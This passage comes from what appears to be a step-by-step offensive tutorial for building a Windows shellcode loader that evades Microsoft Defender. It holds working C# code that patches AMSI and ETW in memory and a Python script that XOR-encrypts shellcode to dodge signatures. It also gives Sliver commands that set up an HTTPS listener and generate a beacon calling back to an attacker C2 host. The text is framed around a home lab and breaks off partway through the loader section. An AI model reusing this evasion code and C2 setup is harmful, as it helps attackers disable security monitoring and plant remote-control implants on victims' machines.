    SIZE_T dwSize,              // How many bytes you need
    DWORD  flAllocationType,    // How to allocate (we use 0x3000)
    DWORD  flProtect            // What can we do with this memory
);
```

**Parameters in plain English:**

| Parameter | What it means | What we use |
|-----------|--------------|-------------|
| lpAddress | Where you want the memory. NULL means "anywhere is fine" | NULL |
| dwSize | How many bytes you need | Size of our shellcode |
| flAllocationType | Reserve and/or commit the memory | 0x3000 (do both) |
| flProtect | What operations are allowed | 0x40 (read + write + execute) |

**The crucial parameter - flProtect:**

This controls what you can do with the memory:

| Value | Name | What it means |
|-------|------|---------------|
| 0x02 | PAGE_READONLY | Can only read - can't write or run |
| 0x04 | PAGE_READWRITE | Can read and write - but can't run as code |
| 0x20 | PAGE_EXECUTE_READ | Can read and run - but can't write |
| 0x40 | PAGE_EXECUTE_READWRITE | Can read, write, AND run as code |

**Why we need 0x40 (PAGE_EXECUTE_READWRITE):**

Our shellcode is data that we want to execute as code:
1. We need to WRITE our shellcode bytes into this memory
2. We need to EXECUTE those bytes as CPU instructions

This is suspicious because legitimate programs rarely need this. Security products flag it.

**Return value:**
- **Success:** The address of the memory Windows gave us
- **Failure:** NULL (0)

### VirtualProtect

**What it does:** Changes what you can do with a section of memory

**In plain English:** "Hey Windows, I want to change the rules for this memory region. Make it writable so I can modify the code there."

**Technical signature:**
```c
BOOL VirtualProtect(
    LPVOID lpAddress,           // Starting address of the memory
    SIZE_T dwSize,              // How many bytes to change
    DWORD  flNewProtect,        // New permissions (0x40 for read/write/execute)
    PDWORD lpflOldProtect       // Stores the old permissions (required)
);
```

**Why we need this:**

The code inside DLLs (like amsi.dll) is marked as PAGE_EXECUTE_READ - you can run it, but you can't modify it.

We NEED to modify it to patch AMSI. So the flow is:
1. Find AmsiScanBuffer's address
2. Call VirtualProtect to make it writable
3. Write our patch bytes
4. AMSI is now disabled

**Return value:**
- **Success:** Non-zero (TRUE)
- **Failure:** Zero (FALSE)

### CreateThread

**What it does:** Starts a new path of execution in your program

**In plain English:** "Hey Windows, create a new worker thread and have it start running code at this address."

**Why this is the key to shellcode execution:**

After we've:
1. Allocated memory with execute permission
2. Copied our shellcode into that memory

We need to actually RUN it. CreateThread creates a new thread that starts executing at the address we specify - which is our shellcode.

**Technical signature:**
```c
HANDLE CreateThread(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,     // NULL = default security
    SIZE_T                  dwStackSize,            // 0 = default stack size
    LPTHREAD_START_ROUTINE  lpStartAddress,         // WHERE TO START EXECUTING
    LPVOID                  lpParameter,            // NULL = no parameters
    DWORD                   dwCreationFlags,        // 0 = start immediately
    LPDWORD                 lpThreadId              // NULL = we don't need the ID
);
```

**The critical parameter: lpStartAddress**

This is the memory address where the new thread will start executing. We set this to the address where we put our shellcode.

When the thread starts:
1. CPU sets its instruction pointer to lpStartAddress
2. CPU reads bytes at that address and executes them
3. Our shellcode runs
4. Shellcode connects to our C2 server
5. We have a shell!

**Return value:**
- **Success:** Handle to the new thread
- **Failure:** NULL (0)

### WaitForSingleObject

**What it does:** Pauses the current thread until something finishes

**In plain English:** "Hey Windows, don't let my main program exit. Wait here until the shellcode thread is done."

**Why we need this:**

After CreateThread, our main program would immediately exit. When the main program exits, Windows terminates the entire process including our shellcode thread.

WaitForSingleObject keeps the main thread alive (just waiting) while the shellcode thread runs.

**Technical signature:**
```c
DWORD WaitForSingleObject(
    HANDLE hHandle,         // Handle to the thread (from CreateThread)
    DWORD  dwMilliseconds   // How long to wait (0xFFFFFFFF = forever)
);
```

**We use INFINITE (0xFFFFFFFF)** because our shellcode (C2 beacon) runs indefinitely. We want our loader to wait forever.

---

# PART 4: Memory Management {#part-4-memory-management}

## 4.1: Virtual Memory

**Definition:** Virtual memory is an abstraction layer that gives each process its own isolated address space.

**What this means:**

Each process thinks it has access to the entire address range (0 to maximum address). In reality, the OS maps these virtual addresses to physical RAM locations.

**Example:**
- Process A accesses virtual address 0x10000
- Process B also accesses virtual address 0x10000
- These are DIFFERENT physical RAM locations
- The OS maintains separate mappings for each process

**Why this exists:**
1. **Isolation:** One process cannot read another process's memory
2. **Simplicity:** Each process can use any address without coordinating with other processes
3. **Security:** A bug in one process cannot corrupt another process

## 4.2: Address Space Layout

A Windows process has a defined address space layout:

```
PROCESS ADDRESS SPACE (64-bit):
-------------------------------

0x00000000'00000000 +---------------------------+
                    | NULL pointer guard        | Invalid region
0x00000000'00010000 +---------------------------+
                    | Process executable (.exe) | Code and data of main program
                    +---------------------------+
                    | Loaded DLLs               | kernel32.dll, ntdll.dll, etc.
                    +---------------------------+
                    | Heap                      | Dynamic allocations (VirtualAlloc)
                    +---------------------------+
                    | Stack                     | Function call stack
                    +---------------------------+
                    | (more heap/loaded DLLs)   |
0x00007FFF'FFFFFFFF +---------------------------+
                    | Kernel space              | Not accessible from user mode
0xFFFFFFFF'FFFFFFFF +---------------------------+
```

## 4.3: Memory Protection

Each region of memory has protection attributes that define what operations are allowed.

**Protection values:**

| Value | Name | Can Read | Can Write | Can Execute |
|-------|------|----------|-----------|-------------|
| 0x01 | PAGE_NOACCESS | No | No | No |
| 0x02 | PAGE_READONLY | Yes | No | No |
| 0x04 | PAGE_READWRITE | Yes | Yes | No |
| 0x10 | PAGE_EXECUTE | No | No | Yes |
| 0x20 | PAGE_EXECUTE_READ | Yes | No | Yes |
| 0x40 | PAGE_EXECUTE_READWRITE | Yes | Yes | Yes |

**DEP (Data Execution Prevention):**

Modern Windows enables DEP by default. DEP enforces that:
- Memory marked as data (PAGE_READWRITE) cannot be executed
- Memory marked as code (PAGE_EXECUTE_READ) cannot be modified

This prevents attacks where data gets interpreted as code. To run shellcode, we must explicitly allocate memory with execute permission.

## 4.4: Why RWX Memory is Suspicious

Legitimate programs follow this pattern:
- Code sections: PAGE_EXECUTE_READ (run but not modify)
- Data sections: PAGE_READWRITE (read/write but not run)

Shellcode requires PAGE_EXECUTE_READWRITE because:
1. We write shellcode bytes into memory (requires write)
2. We execute those bytes (requires execute)

Security products monitor for VirtualAlloc with PAGE_EXECUTE_READWRITE (0x40) because:
- It is uncommon in legitimate software
- It is almost always used by malware loaders
- It indicates code injection or dynamic code generation

---

# PART 5: Processes and Threads {#part-5-processes-threads}

## 5.1: What is a Process

**Definition:** A process is an instance of a running program.

**Components of a process:**
- **Virtual address space:** Private memory accessible only to this process
- **Executable code:** The instructions that run
- **Handles:** References to OS objects (files, registry keys, threads)
- **Security context:** The user account and permissions the process runs under
- **At least one thread:** The actual execution path

When you run notepad.exe:
1. Windows creates a new process
2. Notepad's code is loaded into the process's address space
3. Required DLLs are loaded
4. A thread is created to start executing notepad's code

## 5.2: What is a Thread

**Definition:** A thread is a path of execution within a process.

A process can have multiple threads. All threads in a process share:
- The same virtual address space
- The same handles
- The same code

Each thread has its own:
- Stack (for function calls and local variables)
- Registers (including instruction pointer)
- Thread-local storage

**Multiple threads:**

Modern programs use multiple threads for parallelism:
- Chrome uses threads for each tab
- A game might use threads for graphics, audio, and physics
- A malware loader can create a thread to run shellcode

## 5.3: Thread Execution

Each thread has an **Instruction Pointer (IP)** register that points to the next instruction to execute.

**Execution cycle:**
1. CPU reads instruction at address pointed to by IP
2. CPU executes that instruction
3. IP advances to next instruction
4. Repeat

When we create a thread for shellcode:
1. We tell CreateThread to start at our shellcode address
2. Windows creates a new thread with IP set to that address
3. CPU starts executing bytes at that address as instructions
4. Our shellcode runs

## 5.4: Process Creation and Defender Scanning

When you double-click an .exe:

```
1. Explorer.exe calls CreateProcess()
       |
       v
2. Kernel creates process object
       |
       v
3. Kernel loads .exe into memory
       |
       v
4. DEFENDER SCANS THE FILE <-- Static scan happens here
       |
       v
5. If clean: Kernel loads required DLLs
       |
       v
6. Kernel creates initial thread
       |
       v
7. Thread starts executing at entry point
```

Defender scans the file BEFORE code execution begins. This is static scanning. If the file contains known malware signatures, execution is blocked.

This is why we encrypt our shellcode. Encrypted bytes do not match signatures.

---

# PART 6: How Malware Gets Detected {#part-6-detection}

Now that we understand how computers work, let's understand how they catch malware. Once you understand detection, you can understand evasion.

## 6.1: The Three Stages of Detection

Security products try to catch malware at three stages:

| Stage | When it happens | What's checked | Our counter |
|-------|----------------|----------------|-------------|
| **Static** | Before code runs | File signatures, patterns, structure | Encrypt shellcode |
| **Runtime** | While code runs | Script content, API calls | Patch AMSI/ETW |
| **Behavioral** | After code runs | What the program actually does | Blend with normal behavior |

Let's understand each stage.

## 6.2: Static Detection - Catching Files Before They Run

**What is it?**

Static detection looks at a file BEFORE it executes. It analyzes the bytes of the file itself.

**Methods used:**

**Signature matching:**
Security products have databases of known malware "signatures" - specific byte patterns.

Example: If the bytes `DE AD BE EF CA FE` appear in a file, and those bytes are known to be from Mimikatz, the file is flagged.

**In plain English:** It's like having mugshots of known criminals. If someone matches a mugshot, they're caught.

**Heuristic analysis:**
Beyond exact matches, static analysis looks for suspicious characteristics:
- Strange section names in executables
- Suspicious API imports (like VirtualAlloc + CreateThread together)
- Signs of packing or encryption

**Machine learning:**
AI models trained on millions of samples can predict whether a file is malicious based on structure and characteristics.

**Why encryption defeats static detection:**

If we encrypt our shellcode, the bytes in the file are scrambled. They don't match any known signatures because they're random-looking data, not recognizable malware.

```
ORIGINAL SHELLCODE:     48 89 5C 24 08 (known malicious pattern)
ENCRYPTED (XOR 0x35):   7D BC 69 11 3D (random-looking bytes)
```

Defender sees `7D BC 69 11 3D` and finds no matching signatures. Static detection passes.

## 6.3: Runtime Detection - Catching Code While It Runs

**What is it?**

Even if a file passes static detection, security products watch what it DOES when it runs.

**The problem static detection can't solve:**

What if malicious code is:
- Typed directly into PowerShell (never saved to disk)?
- Downloaded and executed in memory only?
- Hidden inside a legitimate-looking document?

These "fileless" attacks bypass file-based scanning. That's why runtime detection exists.

**Key runtime detection technologies:**

| Technology | What it does | We must defeat it |
|------------|-------------|-------------------|
| **AMSI** | Scans script content before execution | Yes - we patch it |
| **ETW** | Logs what programs do for later analysis | Yes - we patch it |
| **API Hooking** | Intercepts suspicious API calls | Sometimes |

We'll cover AMSI and ETW in detail in the next sections.

## 6.4: Behavioral Detection - Catching Malware by Actions

**What is it?**

Even if malware passes static and runtime detection, security products watch what programs actually DO and flag suspicious behavior.

**Examples of suspicious behavior:**

- Encrypting many files rapidly (ransomware)
- Accessing LSASS process (credential theft)
- Creating hidden scheduled tasks (persistence)
- Connecting to known-bad IP addresses
- Spawning PowerShell from Office applications

**In plain English:** Even if we don't recognize the criminal, we recognize criminal behavior.

**Why this is harder to bypass:**

Behavioral detection doesn't care about signatures or encryption. It watches actions. If your malware acts malicious, it gets caught.

**Our approach:**

We try to:
- Blend with normal activity
- Execute slowly (not as suspicious as rapid activity)
- Use legitimate tools when possible (living off the land)
- Avoid known-bad patterns

---

# PART 7: What is AMSI {#part-7-amsi}

AMSI is one of the most important security features we need to bypass. Let's understand it completely.

## 7.1: What Problem AMSI Solves

**The old days (before 2015):**

Antivirus scanned files on disk. If malware was saved to the hard drive, antivirus could detect it.

**The problem:**

Attackers learned to avoid the hard drive entirely:
- Download a script, run it directly in PowerShell
- Decode malicious code at runtime
- Never write anything to disk

File-based antivirus couldn't catch these "fileless" attacks because there was no file to scan.

**Microsoft's solution: AMSI**

AMSI (Antimalware Scan Interface) was introduced in Windows 10. It allows applications to request antimalware scans of ANY content - not just files on disk.

**In plain English:** AMSI is like a security checkpoint inside PowerShell itself. Even if your malicious script never touched the hard drive, PowerShell asks Defender "is this script safe?" before running it.

## 7.2: How AMSI Works - The Technical Flow

When you type a command in PowerShell or run a script:

```
YOU TYPE: Invoke-Mimikatz

   PowerShell receives the command
         |
         v
   PowerShell calls AMSI: "Is 'Invoke-Mimikatz' safe?"
         |
         v
   AMSI receives the script content
         |
         v
   AMSI asks Windows Defender to scan the content
         |
         v
   Defender returns: "This contains known malware!"
         |
         v
   AMSI tells PowerShell: "BLOCK IT"
         |
         v
   PowerShell: "This script contains malicious content..."
```

**What applications use AMSI:**
- PowerShell
- Windows Script Host (VBScript, JScript)
- .NET runtime (assemblies loaded into memory)
- Office VBA macros
- JavaScript in web browsers (limited)

## 7.3: The AMSI DLL - Where It Lives

AMSI is implemented in a DLL file called `amsi.dll`. This file is loaded into processes that want to use AMSI.

**Key function: AmsiScanBuffer**

This is the function that actually performs the scan. Its job:
1. Receive content (script, assembly, etc.)
2. Pass it to the antimalware provider (Defender)
3. Return the verdict (clean, malware, suspicious)

**The function signature:**
```c
HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,    // AMSI session context
    PVOID buffer,                // Content to scan (the script)
    ULONG length,                // Length of content
    LPCWSTR contentName,         // Name/identifier
    HAMSISESSION amsiSession,    // Session handle
    AMSI_RESULT *result          // OUTPUT: The verdict
);
```

**Brief:** "Hey Defender, here's some content. Is it malware?"

## 7.4: How We Bypass AMSI (The Key Technique)

**The critical insight:** AMSI runs in the same process as our code (User Mode). It's in the same memory space. We can reach in and MODIFY it.

This is powerful. AMSI is supposed to protect us, but because it runs in User Mode, attackers in that same process can mess with it.

**The bypass strategy:**

We overwrite the beginning of the `AmsiScanBuffer` function with instructions that immediately return "clean," without actually scanning anything.

**Step by step breakdown:**

1.  **Load amsi.dll** using LoadLibrary
    -   This puts AMSI's code into our process memory

2.  **Find AmsiScanBuffer** using GetProcAddress
    -   This gives us the exact memory address of the scanning function

3.  **Change memory protection** using VirtualProtect
    -   By default, code memory is read-only
    -   We make it writable so we can modify it

4.  **Write our patch** - bytes that mean "return success immediately"
    -   We overwrite the function's first few bytes

5.  **AMSI is now blind** - every scan returns "clean"
    -   Any future AMSI scan will hit our patch first

**What patch bytes do we write?**

We write a few bytes that represent CPU instructions:

```
Bytes                     ->    Assembly Instruction
--------------------------------------------------------
0xB8 0x57 0x00 0x07 0x80  ->    mov eax, 0x80070057
0xC3                      ->    ret
```

**What does this do at the CPU level?**

-   `mov eax, 0x80070057` - Put the value 0x80070057 into register EAX
-   `ret` - Return from the function immediately (go back to caller)

The function never scans anything! It just puts a value in EAX and returns.

**Why 0x80070057?**

This is the Windows error code `E_INVALIDARG`. When AmsiScanBuffer returns this, the calling application (like PowerShell) thinks "AMSI failed gracefully, but it's not malware, so let it through."

**Attack outcome:** We replace AMSI's brain with code that instantly says "everything is fine."

## 7.5: AMSI Bypass in C# Code

Here's the code we'll use in our loader:

```csharp
static void PatchAMSI()
{
    // Step 1: Load amsi.dll
    IntPtr hAmsi = LoadLibrary("amsi.dll");
    
    // Step 2: Find AmsiScanBuffer address
    IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    
    // Step 3: Make the memory writable
    uint oldProtect;
    VirtualProtect(pAmsiScanBuffer, 6, 0x40, out oldProtect);
    
    // Step 4: Write our patch
    // 0xB8 = mov eax, ...
    // 0x57 0x00 0x07 0x80 = 0x80070057 (E_INVALIDARG)
    // 0xC3 = ret
    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
    
    // Done! AMSI is now disabled for this process
}
```

After this runs, any AMSI scan in our process returns "clean."

---

# PART 8: What is ETW {#part-8-etw}

ETW is another technology that can expose our activities. Let's understand and bypass it.

## 8.1: What Problem ETW Solves (For Defenders)

**ETW = Event Tracing for Windows**

ETW is Windows' built-in system for logging what happens on the computer. It's been around since Windows 2000 but became crucial for security in modern Windows.

**What gets logged via ETW:**
- Process creation and termination
- Network connections
- Registry modifications
- File system changes
- .NET assembly loading
- PowerShell commands
- And hundreds of other events

**In plain English:** ETW is like security cameras recording everything that happens in a building.

## 8.2: Why ETW is a Problem for Attackers

**Even if you bypass AMSI, ETW still sees you.**

Example scenario:
1. You bypass AMSI successfully
2. You run Invoke-Mimikatz in PowerShell
3. AMSI doesn't block it (we patched it)
4. BUT... the PowerShell ETW provider logs that you ran Invoke-Mimikatz
5. That log goes to Windows Event Log or to the EDR
6. A security analyst or automated detection sees it
7. You're caught

**The key insight:** AMSI is real-time blocking. ETW is logging for later analysis. We need to defeat both.

## 8.3: How ETW Works - The Technical Flow

```
YOUR MALWARE RUNS
        |
        | Does something (loads assembly, runs command)
        v
.NET RUNTIME / POWERSHELL
        |
        | Calls ETW to log the event
        v
EtwEventWrite() function in ntdll.dll
        |
        | Writes event to ETW session
        v
ETW CONSUMERS (Event Log, EDR, SIEM)
        |
        | Receive and process the event
        v
ALERT: "Suspicious activity detected!"
```

**The key function: EtwEventWrite**

All ETW events go through this function in ntdll.dll. If we can disable this function, no events get logged.

## 8.4: How We Bypass ETW

**Same approach as AMSI:** Patch the function to do nothing.

**The patch:**

We write a single byte at the start of EtwEventWrite:
```
0xC3    â†’    ret (return immediately)
```

This makes EtwEventWrite return without doing anything. No events get logged.

**ETW Bypass in C# Code:**

```csharp
static void PatchETW()
{
    // Get handle to ntdll.dll (always loaded)
    IntPtr hNtdll = LoadLibrary("ntdll.dll");
    
    // Find EtwEventWrite
    IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    
    // Make it writable
    uint oldProtect;
    VirtualProtect(pEtwEventWrite, 1, 0x40, out oldProtect);
    
    // Write 'ret' instruction
    Marshal.WriteByte(pEtwEventWrite, 0xC3);
    
    // Done! ETW logging is disabled for this process
}
```

After this runs, our process doesn't generate ETW events - no logging of our malicious activities.

## 8.5: Why Both AMSI and ETW Bypasses are Needed

| Security Feature | What it does | If we don't bypass |
|------------------|--------------|-------------------|
| **AMSI** | Blocks known malicious scripts | Our PowerShell commands get blocked |
| **ETW** | Logs activities for later analysis | Even if not blocked, we get logged and detected later |

**Our bypass order:**
1. Patch AMSI first (so our patching code doesn't get blocked)
2. Patch ETW second (so the AMSI patching isn't logged)
3. Now we can run our actual payload safely

---

# PART 9: What is Shellcode {#part-9-shellcode}

Now let's understand what we're actually delivering - shellcode.

## 9.1: What is Shellcode?

**Definition:**

Shellcode is raw machine code (CPU instructions) that's designed to be injected and executed in a running process.

**In plain English:** Shellcode is the actual "payload" - the instructions that do something useful (or malicious) like connecting to our server.

**Why is it called "shellcode"?**

Historically, this type of code was used in exploits to spawn a command shell. The attacker would exploit a vulnerability and inject code that opened a shell (command prompt). The name stuck, even though modern shellcode does much more than spawn shells.

## 9.2: How Shellcode Differs from Normal Programs

| Aspect | Normal Program (.exe) | Shellcode |
|--------|----------------------|-----------|
| Format | PE format with headers, sections | Raw bytes, no format |
| Size | Kilobytes to megabytes | Usually bytes to kilobytes |
| Dependencies | Loads DLLs, uses imports | Self-contained or resolves at runtime |
| Execution | Windows loader runs it | Must be injected and started manually |
| Position | Loaded at expected address | Works at any address (position-independent) |

**Key property: Position-Independent**

Normal programs are compiled to run at a specific memory address. Shellcode doesn't know where it will be loaded, so it's written to work at ANY address. This is called "position-independent code."

## 9.3: Where Does Shellcode Come From?

**For our attack, we generate shellcode from Sliver:**

```bash
# On Kali, in Sliver console:
generate beacon --http 192.168.100.100:443 --format shellcode --save /tmp/beacon.bin
```

This generates raw bytes that:
1. When executed, connect back to our Sliver server
2. Establish an encrypted communication channel
3. Allow us to run commands on the target

**The shellcode contains everything needed:** network code, encryption, protocol handling - all in a compact blob of bytes.

## 9.4: Why We Encrypt Shellcode

**The problem:**

Sliver shellcode (and Cobalt Strike, Metasploit, etc.) has known signatures. Security vendors have analyzed these tools and added their patterns to signature databases.

If we use the raw shellcode, Defender recognizes it:
```
"I see bytes that match Sliver beacon signature â†’ BLOCKED"
```

**The solution: Encryption**

We encrypt the shellcode before embedding it in our loader:
```python
# XOR encryption (simple but effective for static bypass)
encrypted = []
for byte in shellcode:
    encrypted.append(byte ^ 0x35)  # XOR with key 0x35
```

Now the bytes are scrambled. Defender sees random-looking data, not Sliver signatures.

**At runtime:**
Our loader decrypts the shellcode (XOR again with the same key), copies it to executable memory, and runs it.

## 9.5: The Complete Shellcode Execution Flow

```
1. ENCRYPTED SHELLCODE (in our loader)
   Looks random, bypasses static detection
         |
         v
2. LOADER STARTS, PATCHES AMSI
   AMSI can't block our script operations
         |
         v
3. LOADER PATCHES ETW
   No logging of our activities
         |
         v
4. LOADER ALLOCATES RWX MEMORY
   VirtualAlloc with PAGE_EXECUTE_READWRITE
         |
         v
5. LOADER DECRYPTS SHELLCODE
   XOR each byte with the key
         |
         v
6. LOADER COPIES SHELLCODE TO MEMORY
         |
         v
7. LOADER CREATES THREAD AT SHELLCODE
   CreateThread with lpStartAddress = shellcode address
         |
         v
8. SHELLCODE EXECUTES
   Connects to our C2 server
         |
         v
9. WE HAVE A SHELL!
```

---

*[END OF PORTION 2]*

**Portion 2 covered:**
---

# PART 10: What is Command & Control (C2) {#part-10-c2}

Now we understand the technical foundations. Let's understand the tool we'll use to control our compromised targets.

## 10.1: What is C2?

**Definition:**

C2 (Command and Control) is the infrastructure that attackers use to communicate with and control compromised systems.

**In plain English:** When malware runs on a victim's computer, it needs to "phone home" to the attacker. The C2 server is the "home" it calls and the "brain" that sends commands.

## 10.2: The C2 Architecture

```
+-----------------+
|  YOU (Attacker) |
|  On Kali Linux  |
+--------+--------+
         |
         | You interact with the C2 console
         v
+---------------------------------------------+
|           SLIVER C2 SERVER                  |
|         (Running on Kali Linux)             |
|                                             |
|  * Listens for incoming connections         |
|  * Receives data from implants              |
|  * Sends commands to implants               |
|  * Manages multiple compromised machines    |
+---------------------------------------------+
         |
         | HTTPS connections (looks like normal web traffic)
         v
+---------------------------------------------+
|           VICTIM MACHINES                   |
|        (Running our shellcode)              |
|                                             |
|  * Execute commands from C2                 |
|  * Send results back to C2                  |
|  * Beacon periodically (check in)           |
+---------------------------------------------+
```

## 10.3: Types of C2 Communication

**Beacon (what we'll use):**
- The implant "checks in" periodically (e.g., every 60 seconds)
- If the C2 has commands waiting, the implant receives and executes them
- Results are sent back on the next check-in
- Looks like normal HTTPS traffic
- Hard to detect because traffic is infrequent and encrypted

**Interactive/Session:**
- Real-time back-and-forth communication
- More powerful but easier to detect (constant traffic)
- Used for active post-exploitation

## 10.4: Why Sliver?

**Sliver** is an open-source C2 framework developed by Bishop Fox. We use it because:

| Feature | Why it matters |
|---------|---------------|
| **Open source** | Free, no licensing issues like Cobalt Strike |
| **Modern** | Active development, evades current defenses |
| **HTTPS support** | Traffic looks like normal web browsing |
| **Shellcode generation** | Can output raw shellcode for our loader |
| **Multi-platform** | Works on Windows, Linux, macOS |
| **Operator-friendly** | Good CLI interface |

**Alternative C2 frameworks you might encounter:**
- Cobalt Strike (commercial, very popular, $3,500/year)
- Metasploit (open source, widely detected)
- Havoc (open source, modern)
- Mythic (open source, modular)

---

# PART 11: Setting Up Sliver C2 on Kali Linux {#part-11-sliver}

Let's set up Sliver step by step on your Kali Linux machine.

## 11.1: Your Lab Environment

**Before you start, confirm your network:**

| Machine | Role | IP Address |
|---------|------|------------|
| **Kali Linux** | Attacker (you) | 192.168.100.100 |
| **DC01** | Domain Controller | 192.168.100.10 |
| **WS01** | Workstation (target) | 192.168.100.20 |
| **WS02** | Workstation (target) | 192.168.100.30 |

Make sure your Kali can ping the Windows machines.

## 11.2: Update Kali Linux

**First, update your system packages:**

```bash
# Update package lists
sudo apt update

# Upgrade installed packages
sudo apt upgrade -y
```

**What is apt?**

`apt` is the package manager for Debian-based Linux systems (including Kali). It downloads and installs software from online repositories.

- `apt update` - Downloads the latest list of available packages
- `apt upgrade` - Upgrades all installed packages to latest versions
- `apt install <package>` - Installs a new package

## 11.3: Installing Sliver

**Method 1: Direct Download (Recommended)**

Sliver provides a one-liner installation script:

```bash
# Download and run the installer
curl https://sliver.sh/install | sudo bash
```

**What does this do?**
1. Downloads the Sliver binary for your architecture
2. Installs it to `/root/sliver-server` or `/usr/local/bin/sliver`
3. Sets up necessary permissions

**Method 2: Using apt (if available)**

Some Kali versions have Sliver in repositories:

```bash
sudo apt install sliver -y
```

**Method 3: Manual Download**

If the above methods don't work:

```bash
# Go to home directory
cd ~

# Download latest release (check GitHub for current version)
wget https://github.com/BishopFox/sliver/releases/download/v1.5.41/sliver-server_linux -O sliver-server

# Make it executable
chmod +x sliver-server

# Move to a system location (optional)
sudo mv sliver-server /usr/local/bin/
```

## 11.4: Installing .NET SDK (For Building Our Loader)

Our loader will be written in C#. We need the .NET SDK to compile it.

**Install .NET SDK:**

```bash
# Add Microsoft package repository
wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
rm packages-microsoft-prod.deb

# Update and install .NET SDK
sudo apt update
sudo apt install -y dotnet-sdk-8.0
```

**Verify installation:**

```bash
dotnet --version
# Should show something like: 8.0.xxx
```

**What is the .NET SDK?**

The .NET SDK (Software Development Kit) includes:
- The C# compiler (to turn our code into an executable)
- The .NET runtime (to run .NET applications)
- Tools for building and publishing applications

## 11.5: Starting Sliver

**Start the Sliver server:**

```bash
# If installed via script
sliver-server

# If you have the binary in current directory
./sliver-server
```

**What you should see:**

```
    ____  _     _____     _______ ____  
   / ___|| |   |_ _\ \   / / ____|  _ \ 
   \___ \| |    | | \ \ / /|  _| | |_) |
    ___) | |___ | |  \ V / | |___|  _ < 
   |____/|_____|___|  \_/  |_____|_| \_\

All hackers gain mass
[*] Server v1.5.41 - abc123def456
[*] Welcome to the sliver shell, please type 'help' for options

sliver >
```

You're now in the Sliver console!

## 11.6: Setting Up an HTTPS Listener

**A listener waits for incoming connections from implants.**

```bash
# In the Sliver console:
https -l 192.168.100.100 -p 443
```

**Breaking down the command:**
- `https` - Start an HTTPS listener (encrypted, looks like web traffic)
- `-l 192.168.100.100` - Listen on this IP (your Kali's IP)
- `-p 443` - Listen on port 443 (standard HTTPS port)

**What you should see:**

```
[*] Starting HTTPS listener ...
[*] Successfully started job #1
```

**Verify the listener is running:**

```bash
sliver > jobs
```

**Output:**

```
 ID   Name   Protocol   Port   
==== ====== ========== ======
 1    https   tcp       443
```

## 11.7: Generating Shellcode

**Now let's generate the shellcode that our loader will execute.**

```bash
sliver > generate beacon --http 192.168.100.100:443 --os windows --arch amd64 --format shellcode --save /tmp/beacon.bin
```

**Breaking down the command:**

| Option | What it does |
|--------|-------------|
| `generate beacon` | Create a beacon implant (periodic check-in) |
| `--http 192.168.100.100:443` | Connect to our C2 via HTTPS on port 443 |
| `--os windows` | Target Windows operating system |
| `--arch amd64` | Target 64-bit architecture |
| `--format shellcode` | Output raw shellcode (not an .exe) |
| `--save /tmp/beacon.bin` | Save to this file |

**What you should see:**

```
[*] Generating new windows/amd64 beacon implant binary
[*] Build completed in 45s
[*] Shellcode written to /tmp/beacon.bin (123456 bytes)
```

**Verify the file was created:**

```bash
# Exit Sliver temporarily (or open a new terminal)
ls -la /tmp/beacon.bin

# Check the size
wc -c /tmp/beacon.bin
```

## 11.8: Encrypting the Shellcode

**We encrypt the shellcode so it doesn't match signatures.**

Create a Python script to encrypt:

```bash
nano /tmp/encrypt_shellcode.py
```

Paste this code:

```python
#!/usr/bin/env python3
"""
Shellcode Encryptor - XOR encryption
This encrypts shellcode so it doesn't match antivirus signatures.
"""

import sys

def xor_encrypt(data, key):
    """XOR each byte with the key"""
    return bytes([b ^ key for b in data])

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 encrypt_shellcode.py <input_file> <output_file>")
        print("Example: python3 encrypt_shellcode.py beacon.bin beacon_encrypted.bin")
        sys.exit(1)
    
    input_file = sys.argv[1]
    output_file = sys.argv[2]
    xor_key = 0x35  # Our encryption key - remember this!
    
    # Read the raw shellcode
    with open(input_file, 'rb') as f:
        shellcode = f.read()
    
    print(f"[*] Read {len(shellcode)} bytes from {input_file}")
    
    # Encrypt it
    encrypted = xor_encrypt(shellcode, xor_key)
    
    # Write encrypted shellcode
    with open(output_file, 'wb') as f:
        f.write(encrypted)
    
    print(f"[*] Encrypted shellcode written to {output_file}")
    print(f"[*] XOR key used: 0x{xor_key:02x}")
    print(f"[*] Remember: use the same key (0x{xor_key:02x}) in your loader!")
    
    # Also output as C# byte array for convenience
    cs_output = output_file.replace('.bin', '.cs')
    with open(cs_output, 'w') as f:
        f.write("// Encrypted shellcode - paste this into your loader\n")
        f.write("byte[] encryptedShellcode = new byte[] {\n    ")
        for i, b in enumerate(encrypted):
            f.write(f"0x{b:02x}")
            if i < len(encrypted) - 1:
                f.write(", ")
            if (i + 1) % 12 == 0:
                f.write("\n    ")
        f.write("\n};\n")
    
    print(f"[*] C# byte array written to {cs_output}")

if __name__ == "__main__":
    main()
```

**Run the encryption script:**

```bash
python3 /tmp/encrypt_shellcode.py /tmp/beacon.bin /tmp/beacon_encrypted.bin
```

**Output:**

```
[*] Read 123456 bytes from /tmp/beacon.bin
[*] Encrypted shellcode written to /tmp/beacon_encrypted.bin
[*] XOR key used: 0x35
[*] Remember: use the same key (0x35) in your loader!
[*] C# byte array written to /tmp/beacon_encrypted.cs
```

Now you have:
- `/tmp/beacon_encrypted.bin` - Encrypted shellcode (binary)
- `/tmp/beacon_encrypted.cs` - C# byte array ready to paste

---

# PART 12: Building Our Complete Loader {#part-12-loader}

Now let's build the actual malware loader that will bypass Defender and execute our shellcode.

**What is a "Loader" and why do we need it?**

A loader is a small program whose job is to:
1. Receive our shellcode (which is just raw bytes)
2. Prepare the memory to execute it
3. Tell the CPU to start running it

Why can't we just run the shellcode directly? Because shellcode is just data (bytes). Windows won't execute random bytes unless we specifically set things up to do so.

**Our loader will do these steps:**

```
STEP 1: Patch AMSI
         |
         | (So Defender can't scan our script content)
         v
STEP 2: Patch ETW
         |
         | (So no logs are recorded of our activities)
         v
STEP 3: Decrypt shellcode
         |
         | (The encrypted bytes become executable code)
         v
STEP 4: Allocate executable memory
         |
         | (Get RAM that we can write AND execute)
         v
STEP 5: Copy shellcode to that memory
         |
         | (Put our code in the executable space)
         v
STEP 6: Create a thread to execute it
         |
